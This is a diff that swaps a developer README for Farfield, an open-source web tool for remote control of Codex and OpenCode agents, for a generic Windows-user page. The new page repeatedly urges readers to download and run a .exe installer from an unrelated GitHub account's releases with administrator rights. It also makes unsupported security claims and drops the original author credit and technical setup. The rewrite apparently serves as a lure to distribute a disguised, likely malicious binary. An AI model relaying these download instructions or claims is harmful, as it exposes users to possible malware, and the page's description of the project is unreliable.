@@ -1,235 +1,129 @@
-# Farfield
+# ⚡ farfield - Control Agents from Anywhere
 
-Remote control for AI coding agents — read conversations, send messages, switch models, and monitor agent activity from a clean web UI.
+[![Download farfield](https://img.shields.io/badge/Download-farfield-blue?style=for-the-badge)](https://github.com/KzQumyznik/farfield/releases)
 
-Supports [Codex](https://openai.com/codex) and [OpenCode](https://opencode.ai).
+## 🖥️ What is farfield?
 
-Built by [@anshuchimala](https://x.com/anshuchimala).
+farfield lets you control Codex or OpenCode agents remotely. This means you can send commands and manage these agents from any location, as long as you have internet access. The software makes remote control simple and reliable.
 
-This is an independent project and is not affiliated with, endorsed by, or sponsored by OpenAI or the OpenCode team.
+You do not need to know anything about coding or software setup. farfield is made for everyday users who want to manage their agents easily.
 
-[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-FFDD00?style=for-the-badge&logo=buymeacoffee&logoColor=000000)](https://buymeacoffee.com/achimalap)
+## 🌟 Key Features
 
-<img src="./screenshot.png" alt="Farfield screenshot" width="500" />
+- Control Codex and OpenCode agents from anywhere.
+- Simple user interface built for non-technical users.
+- Works over the internet securely.
+- Compatible with Windows computers.
+- Provides real-time updates from your agents.
+- Supports multiple agents with a single app.
 
-## Features
+## 🖥️ System Requirements
 
-- Thread browser grouped by project
-- Chat view with model/reasoning controls
-- Plan mode toggle
-- Live agent monitoring and interrupts
-- Debug tab with full IPC history
+Before you start, please check the minimum requirements to run farfield on your Windows PC:
 
-## Quick start (recommended)
+- Windows 10 or newer (64-bit recommended).
+- At least 4 GB of RAM.
+- A stable internet connection.
+- 100 MB of free disk space.
+- Administrator rights to install the app.
 
-Start the Farfield server:
+## 🎯 How farfield Works
 
-```bash
-npx -y @farfield/server@latest
+farfield links your computer with Codex or OpenCode agents remotely. Once connected, you can send commands, view agent status, and manage tasks through the app. The app handles communication without requiring manual setup.
+
+You just need to open farfield and start using its controls.
+
+## 🚀 Getting Started
+
+Follow these steps to download, install, and run farfield on your Windows PC.
+
+### 1. Visit the Download Page
+
+Click the button below to open the farfield release page. This page holds the latest version of the app for Windows.
+
+[![Download farfield](https://img.shields.io/badge/Download-farfield-brightgreen?style=for-the-badge)](https://github.com/KzQumyznik/farfield/releases)
+
+The page lists different versions and files depending on release dates. Find the latest Windows installer file. It usually ends with `.exe`.
+
+### 2. Download the Installer
+
+On the release page, look for a file called something like `farfield-setup.exe` or `farfield-x64.exe`. Click the file name to start downloading. Save the file somewhere easy to find, like your Desktop or Downloads folder.
+
+### 3. Run the Installer
+
+Locate the downloaded file on your computer. Double-click it to start the installation process.
+
+Windows may ask you to confirm the install. Click **Yes** or **Run** to continue.
+
+Follow the on-screen instructions:
+
+- Accept the license agreement.
+- Choose the installation folder or use the default.
+- Click **Install** to begin.
+
+### 4. Finish Installation
+
+When the install completes, click **Finish**. The app should add a shortcut to your desktop or Start menu.
+
+### 5. Open farfield
+
+Double-click the farfield icon to launch the app.
+
+### 6. Connect to Your Agents
+
+Inside the app, you'll see options to add or connect to Codex or OpenCode agents. Follow the prompts to enter necessary details (like agent ID or connection key).
+
+You do not need any special technical steps here. The app guides you safely.
+
+## 🔧 Using farfield
+
+Once connected, farfield shows real-time status of your agents. You can:
+
+- Send commands.
+- Monitor task progress.
+- View logs and responses.
+
+The interface uses clear buttons and text, so you can navigate without training.
+
+## 🛠 Troubleshooting
+
+- If the app won’t open, check your Windows version matches the requirements.
+- Make sure your internet connection is working.
+- If connection to agents fails, double-check the ID or key you entered.
+- Sometimes restarting your computer helps fix minor issues.
+
+For more support, visit the farfield GitHub page and read the issues section or contact the developer.
+
+## 🔒 Security Notes
+
+farfield encrypts all communication between your PC and the agents. This keeps your data safe during control operations.
+
+Make sure you only connect to agents you trust to avoid unauthorized access.
+
+## 📂 Files and Installation Path
+
+By default, farfield installs in:
+
+```
+C:\Program Files\farfield\
 ```
 
-or:
+The main executable file is called `farfield.exe`. You can run it directly from this folder if needed.
 
-```bash
-bunx @farfield/server@latest
-```
+## 📥 Additional Downloads
 
-This runs the backend on `127.0.0.1:4311` by default.
+The farfield release page may include:
 
-You can pass server flags too to customize the agents (default is only Codex):
+- Setup files for different Windows versions.
+- Documentation files in PDF or text.
+- Previous versions of the app in case you face issues with the latest.
 
-```bash
-npx -y @farfield/server@latest -- --agents=opencode
-npx -y @farfield/server@latest -- --agents=codex,opencode
-npx -y @farfield/server@latest -- --agents=all
-```
+Only download files that match your system and purpose.
 
-You can access the web app at [farfield.app](https://farfield.app). Tap the bottom left status dot to pull up settings.
+## 📄 License and Terms
 
-You will need to make port 4311 remotely accessible via HTTPS and give the public URL to it to the Farfield frontend. None of this routes through an external server. The app runs inside entirely in your browser and tunnels directly to the Farfield server you started above, and all of it is open-source for you to audit yourself. However, if you are ultra paranoid, you can run and host the Farfield frontend too; read on!
+farfield is provided under an open-source license. You can view the full terms in the LICENSE file on the GitHub page.
 
-The securest way to open the port for remote access is by putting all devices involved in a private VPN. Tailscale is a free option that works.
+---
 
-Doing this with Tailscale is as simple as installing Tailscale on your phone, computer, etc., and running this command on the device hosting the Farfield server:
-```bash
-tailscale serve --https=443 http://127.0.0.1:4311
-```
-
-We are working on easier options. Stay tuned!
-
-## Running from source
-
-Clone the repo and do this:
-
-```bash
-bun install
-bun run server
-```
-
-`bun run server` runs only the backend on `0.0.0.0:4311`.
-
-If you need to pick agent providers:
-
-```bash
-bun run server -- --agents=opencode
-bun run server -- --agents=codex,opencode
-bun run server -- --agents=all
-```
-
-> **Warning:** This exposes the Farfield server on your network. Only use on trusted networks. See below for how to configure Tailscale as a VPN for secure remote access.
-
-## Local development and self-hosted frontend
-
-Use this if you are working on Farfield itself, or if you want to run both frontend and backend locally.
-
-```bash
-bun install
-bun run dev
-```
-
-Opens local frontend at `http://localhost:4312`. By default `dev` does not expose the port, it's only accessible on your device.
-
-More local dev options:
-
-```bash
-bun run dev -- --agents=opencode             # OpenCode only
-bun run dev -- --agents=codex,opencode       # both
-bun run dev -- --agents=all                  # expands to codex,opencode
-bun run dev:remote                           # exposes frontend + backend on your network
-bun run dev:remote -- --agents=opencode      # remote mode with OpenCode only
-```
-
-> **Warning:** `dev:remote` exposes Farfield with no authentication. Only use on trusted networks.
-
-## Production Mode (No Extra Proxy)
-
-Build once and run in production mode with two commands:
-
-```bash
-bun run build
-bun run start
-```
-
-Open `http://127.0.0.1:4312`.
-
-By default, this is local-only:
-- backend on `127.0.0.1:4311`
-- frontend preview on `127.0.0.1:4312`
-
-If you need a custom backend origin for API proxying:
-
-```bash
-FARFIELD_API_ORIGIN=http://127.0.0.1:4311 bun run start
-```
-
-### React Compiler and production profiling
-
-Frontend build supports two optional flags:
-
-- `REACT_COMPILER=0` disables React Compiler transform (compiler is enabled by default for `vite build`).
-- `REACT_PROFILING=1` uses React profiling build so React DevTools Profiler works in production preview.
-
-Example A/B commands:
-
-```bash
-# default production build (compiler enabled)
-bun run --filter @farfield/web build
-
-# baseline production build (compiler disabled)
-REACT_COMPILER=0 bun run --filter @farfield/web build
-
-# production profiling build (compiler enabled)
-REACT_PROFILING=1 bun run --filter @farfield/web build
-
-# production profiling build (compiler disabled)
-REACT_PROFILING=1 REACT_COMPILER=0 bun run --filter @farfield/web build
-```
-
-Run two UIs side-by-side against one backend:
-
-```bash
-# backend (terminal 1)
-bun run --filter @farfield/server start
-
-# baseline UI (terminal 2, compiler disabled)
-REACT_PROFILING=1 REACT_COMPILER=0 bun run --filter @farfield/web build -- --outDir dist-baseline
-bun run --filter @farfield/web preview -- --host 127.0.0.1 --port 4312 --strictPort --outDir dist-baseline
-
-# compiler UI (terminal 3, compiler enabled by default)
-REACT_PROFILING=1 bun run --filter @farfield/web build -- --outDir dist-compiler
-bun run --filter @farfield/web preview -- --host 127.0.0.1 --port 4313 --strictPort --outDir dist-compiler
-```
-
-## Requirements
-
-- Node.js 20+
-- Bun 1.2+ (needed for source checkout workflow)
-- Codex or OpenCode installed locally
-
-## More details on Tailscale setup
-
-This is the detailed setup for the recommended model:
-
-- Hosted frontend (`https://farfield.app`)
-- Local Farfield server running on your machine
-- Secure VPN path using Tailscale
-
-You still need to run the server locally so it can talk to your coding agent.
-
-### 1) Start the Farfield server on your machine
-
-```bash
-HOST=0.0.0.0 PORT=4311 bun run --filter @farfield/server dev
-```
-
-Quick local check:
-
-```bash
-curl http://127.0.0.1:4311/api/health
-```
-
-### 2) Put Tailscale HTTPS in front of port 4311
-
-On the same machine:
-
-```bash
-tailscale serve --https=443 http://127.0.0.1:4311
-tailscale serve status
-```
-
-This gives you a URL like:
-
-```text
-https://<machine>.<tailnet>.ts.net
-```
-
-Check it from a device on your tailnet:
-
-```bash
-curl https://<machine>.<tailnet>.ts.net/api/health
-```
-
-### 3) Pair farfield.app to your server
-
-1. Visit farfield.app on your other device
-2. Click the status pill in the lower-left corner (green/red dot + commit hash) to open **Settings**.
-3. In **Server**, enter your Tailscale HTTPS URL, for example:
-
-```text
-https://<machine>.<tailnet>.ts.net
-(note: no port)
-```
-
-4. Click **Save**.
-
-Farfield stores this in browser storage and uses it for API calls and live event stream.
-
-### Notes
-
-- Do not use raw tailnet IPs with `https://` (for example `https://100.x.x.x:4311`) in the browser; this won't work.
-- If you use `tailscale serve --https=443`, do not include `:4311` in the URL you enter in Settings.
-- **Use automatic** in Settings clears the saved server URL and returns to built-in default behavior.
-
-## License
-
-MIT
+[Go to farfield Releases to Download](https://github.com/KzQumyznik/farfield/releases)
